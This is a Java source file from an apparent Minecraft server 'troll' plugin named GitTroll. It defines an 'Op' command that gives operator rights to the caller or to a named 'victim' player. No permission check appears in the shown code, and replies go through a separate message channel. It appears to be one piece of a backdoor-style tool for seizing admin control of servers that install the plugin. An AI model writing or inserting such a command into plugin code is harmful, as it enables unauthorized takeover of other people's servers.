package net.Lenni0451.GitTroll.command.commands.player;

import java.util.List;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class Op extends CommandBase {

	public Op() {
		super("Op", "Op yourself or other players", "[Player]");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isLength(0)) {
			this.execute(executor, new ArrayHelper(args.advanceToStrings(executor.getPlayer().getName())));
		} else if(args.isLength(1)) {
			CustomPlayer vic = CustomPlayer.instanceOf(args.getString(0));
			if(!vic.isValid()) {
				executor.sendGitMessage("§cThe player is not online.");
				return;
			}
			
			if(vic.getPlayer().isOp()) {
				if(vic.equals(executor)) {
					executor.sendGitMessage("§cYou are already opped.");
				} else {
					executor.sendGitMessage("§cThe player is already opped.");
				}
				return;
			}
			vic.getPlayer().setOp(true);
			if(vic.equals(executor)) {
				executor.sendGitMessage("You have been opped.");
			} else {
				executor.sendGitMessage("The player has been opped.");
			}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {
		if(args.isEmpty()) {
			this.tabCompletePlayers(tabComplete);
		}
	}

}
